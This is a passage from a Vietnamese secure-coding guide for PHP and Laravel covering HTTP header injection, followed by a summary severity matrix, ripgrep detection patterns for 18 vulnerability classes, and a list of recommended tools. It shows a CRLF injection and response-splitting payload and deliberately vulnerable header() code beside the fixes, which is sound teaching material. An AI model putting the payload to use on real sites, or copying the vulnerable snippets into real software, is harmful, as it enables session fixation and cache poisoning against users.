     │  GET /set-lang?lang=vi%0d%0aSet-Cookie:+sess=evil
     │  (vi\r\nSet-Cookie: sess=evil)         │                         │
     │───────────────────────────────────────>│                         │
     │                                        │  header("Content-       │
     │                                        │  Language: " . $lang)   │
     │                                        │  = "Content-Language:   │
     │                                        │    vi\r\nSet-Cookie:    │
     │                                        │    sess=evil"           │
     │                                        │─────────────────────────>│
     │                                        │  HTTP Response:          │
     │                                        │  Content-Language: vi   │
     │                                        │  Set-Cookie: sess=evil  │
     │                                        │  <- Kẻ tấn công set cookie!
     │                                        │                          │
     │  RESPONSE SPLITTING:                   │                          │
     │  lang=vi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...
     │  -> Tạo response thứ 2 giả!          │                          │
     │  -> Cache poisoning!                  │                          │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm header() với user input
rg --type php "header\s*\(\s*['\"].*\\\$_(GET|POST|REQUEST|COOKIE)" -n

# Tìm header() với biến chứa user data
rg --type php "header\s*\(\s*['\"].*\\\$" -n -B3

# Tìm setcookie với user input
rg --type php "setcookie\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm Location header với user input
rg --type php "header\s*\(\s*['\"]Location:.*\\\$_(GET|POST)" -n

# Tìm Content-Type với user-controlled charset
rg --type php "header\s*\(\s*['\"]Content-Type:.*\\\$" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Header Injection
// ============================================================
$lang = $_GET['lang']; // "vi\r\nSet-Cookie: sess=evil"
header("Content-Language: $lang"); // Header injection!

// Location redirect injection
$returnUrl = $_GET['return'];
header("Location: $returnUrl"); // Header injection + Open Redirect!

// ============================================================
// SECURE
// ============================================================

// PHP 7.3+ tự động block \r\n trong header()
// Nhưng vẫn cần validate để an toàn

// Cách 1: Validate input trước khi dùng trong header
function setLanguageHeader(string $lang): void
{
    // Whitelist các ngôn ngữ được phép
    $allowedLanguages = ['vi', 'en', 'ja', 'zh', 'ko', 'fr', 'de'];

    if (!in_array($lang, $allowedLanguages, true)) {
        $lang = 'en'; // Default
    }

    // Giờ an toàn - chỉ là giá trị từ whitelist
    header('Content-Language: ' . $lang);
}

// Cách 2: Strip hoặc encode newlines
function safeHeader(string $name, string $value): void
{
    // Loại bỏ tất cả ký tự CRLF
    $safeName  = str_replace(["\r", "\n", "\0"], '', $name);
    $safeValue = str_replace(["\r", "\n", "\0"], '', $value);

    // Validate header name chỉ có ký tự hợp lệ
    if (!preg_match('/^[a-zA-Z0-9\-\_]+$/', $safeName)) {
        throw new \InvalidArgumentException('Header name không hợp lệ');
    }

    header($safeName . ': ' . $safeValue);
}

// Cách 3: Dùng framework response objects (RECOMMENDED)
// Laravel - dùng Response object thay vì header() trực tiếp

class LanguageController extends Controller
{
    private const ALLOWED_LANGUAGES = ['vi', 'en', 'ja', 'zh'];

    public function setLanguage(Request $request): Response
    {
        $lang = $request->input('lang', 'en');

        // Validate với whitelist
        if (!in_array($lang, self::ALLOWED_LANGUAGES, true)) {
            $lang = 'en';
        }

        return response()
            ->json(['lang' => $lang])
            ->withHeaders([
                'Content-Language' => $lang,
                // Laravel response builder tự sanitize headers
            ]);
    }
}

// Symfony - Response class tự sanitize
use Symfony\Component\HttpFoundation\Response;

class ContentController extends AbstractController
{
    #[Route('/content')]
    public function content(Request $request): Response
    {
        $lang = $request->query->get('lang', 'en');

        // Symfony Response tự loại bỏ \r\n trong header values
        $response = new Response();
        $response->headers->set('Content-Language', $lang);
        // Symfony HeaderBag::set() tự sanitize

        return $response;
    }
}

// Cookie injection - an toàn
function setSafeCookie(string $name, string $value): void
{
    // Validate cookie name - không có ký tự đặc biệt
    if (!preg_match('/^[a-zA-Z0-9_\-]+$/', $name)) {
        throw new \InvalidArgumentException('Cookie name không hợp lệ');
    }

    // Loại bỏ CRLF trong value
    $safeValue = str_replace(["\r", "\n", "\0", ";", ",", " "], '', $value);

    setcookie($name, $safeValue, [
        'expires'  => time() + 3600,
        'path'     => '/',
        'secure'   => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Không dùng user input trực tiếp trong `header()` calls
- [ ] Validate và whitelist giá trị trước khi set header
- [ ] Strip `\r`, `\n`, `\0` khỏi bất kỳ giá trị nào đưa vào header
- [ ] Dùng Laravel Response object hoặc Symfony Response class
- [ ] Upgrade PHP >= 7.3 (tự block CRLF trong header())
- [ ] Validate cookie names và values
- [ ] Không set Content-Type từ user input

**PHP version note:**
```
PHP >= 7.3: header() tự động ném Warning và block nếu value chứa \r\n
Nhưng vẫn cần validate vì:
- Null byte (\0) có thể vẫn gây vấn đề
- Logic bypass vẫn có thể qua các encoding khác
```

**OWASP References:**
- CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page
- https://owasp.org/www-community/attacks/HTTP_Response_Splitting

---

## Tổng Kết

### Ma Trận Mức Độ Nghiêm Trọng

| # | Pattern | Mức độ | OWASP 2021 | CWE |
|---|---------|--------|------------|-----|
| 1 | SQL Injection | 🔴 CRITICAL | A03 Injection | CWE-89 |
| 2 | XSS Stored | 🔴 CRITICAL | A03 Injection | CWE-79 |
| 3 | XSS Reflected | 🔴 CRITICAL | A03 Injection | CWE-79 |
| 4 | CSRF Token Thiếu | 🔴 CRITICAL | A01 Broken AC | CWE-352 |
| 5 | File Upload Unrestricted | 🔴 CRITICAL | A04 Insecure Design | CWE-434 |
| 6 | LFI | 🔴 CRITICAL | A03 Injection | CWE-98 |
| 7 | RFI | 🔴 CRITICAL | A03 Injection | CWE-98 |
| 8 | Object Injection | 🔴 CRITICAL | A08 Integrity Failures | CWE-502 |
| 9 | Command Injection | 🔴 CRITICAL | A03 Injection | CWE-78 |
| 10 | Session Fixation | 🔴 CRITICAL | A07 Auth Failures | CWE-384 |
| 11 | Session Hijacking | 🟠 HIGH | A07 Auth Failures | CWE-613 |
| 12 | Directory Traversal | 🔴 CRITICAL | A01 Broken AC | CWE-22 |
| 13 | XXE | 🔴 CRITICAL | A05 Misconfiguration | CWE-611 |
| 14 | SSRF | 🟠 HIGH | A10 SSRF | CWE-918 |
| 15 | Open Redirect | 🟡 MEDIUM | — | CWE-601 |
| 16 | Mass Assignment | 🟠 HIGH | A01 Broken AC | CWE-915 |
| 17 | IDOR | 🟠 HIGH | A01 Broken AC | CWE-639 |
| 18 | Header Injection | 🟠 HIGH | A03 Injection | CWE-113 |

### Quick Reference: Regex Tìm Kiếm Nhanh

```bash
# Quét toàn bộ project cho các vấn đề bảo mật phổ biến
# Chạy từ root của project

# 1. SQL Injection
rg --type php "DB::(statement|select)\s*\(\s*[\"'].*\\\$" -n

# 2-3. XSS
rg --type php "\{!!\s*\\\$" -n
rg --type php "echo\s+\\\$_(GET|POST|REQUEST)" -n

# 4. CSRF
rg --type php "->withoutMiddleware\s*\(\s*['\"]VerifyCsrf" -n

# 5. File Upload
rg --type php "move_uploaded_file" -n -A5

# 6-7. LFI/RFI
rg --type php "(include|require)(_once)?\s*\(\s*.*\\\$_(GET|POST)" -n

# 8. Deserialization
rg --type php "unserialize\s*\(\s*\\\$_(GET|POST|COOKIE)" -n

# 9. Command Injection
rg --type php "(exec|system|shell_exec|passthru)\s*\(.*\\\$" -n

# 10-11. Session
rg --type php "session_start" -n -A10 | grep -v "regenerate"

# 12. Directory Traversal
rg --type php "(readfile|file_get_contents)\s*\(.*\\\$_(GET|POST)" -n

# 13. XXE
rg --type php "simplexml_load_(string|file)\s*\(" -n

# 14. SSRF
rg --type php "curl_init\s*\(\s*\\\$_(GET|POST)" -n

# 15. Open Redirect
rg --type php "header\s*\(\s*['\"]Location:.*\\\$_(GET|POST)" -n

# 16. Mass Assignment
rg --type php "(create|fill)\s*\(\s*\\\$request->all" -n

# 17. IDOR
rg --type php "findOrFail\s*\(\s*\\\$" -n

# 18. Header Injection
rg --type php "header\s*\(\s*['\"].*\\\$_(GET|POST)" -n
```

### Công Cụ Bảo Mật Khuyến Nghị

| Công cụ | Mục đích | Cách dùng |
|---------|---------|-----------|
| **phpstan/phpstan** | Static analysis | `vendor/bin/phpstan analyse` |
| **vimeo/psalm** | Static analysis + security | `vendor/bin/psalm` |
| **nunomaduro/larastan** | Laravel-specific phpstan | `vendor/bin/phpstan` |
| **enlightn/enlightn** | Laravel security audit | `php artisan enlightn` |
| **phpmd/phpmd** | Mess detection | `vendor/bin/phpmd src/ text cleancode` |
| **squizlabs/php_codesniffer** | Code standards | `vendor/bin/phpcs` |
| **roave/security-advisories** | Known CVE prevention | Composer plugin |
| **mews/purifier** | HTMLPurifier for Laravel | XSS prevention |
| **phpggc** | Gadget chain finder | Deserialization testing |

```bash
# Cài đặt tất cả security tools
composer require --dev \
    phpstan/phpstan \
    nunomaduro/larastan \
    psalm/plugin-laravel \
    enlightn/enlightn \
    roave/security-advisories:dev-latest

# Run tất cả
vendor/bin/phpstan analyse src --level=8
vendor/bin/psalm --show-info=true
php artisan enlightn --details
```
